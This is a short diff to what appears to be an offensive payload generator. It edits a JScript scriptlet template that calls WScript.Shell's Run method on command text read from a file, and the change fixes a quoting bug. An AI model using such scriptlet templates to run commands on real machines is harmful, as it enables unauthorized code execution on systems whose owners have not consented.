@@ -26,7 +26,7 @@ class Shen:
 
 <script language="JScript">
 <![CDATA[
-		var r = new ActiveXObject("WScript.Shell").Run("'''+open(command,'r',encoding='utf-8').read()+''''");	
+		var r = new ActiveXObject("WScript.Shell").Run("'''+open(command,'r',encoding='utf-8').read()+'''");	
 ]]>
 </script>
 
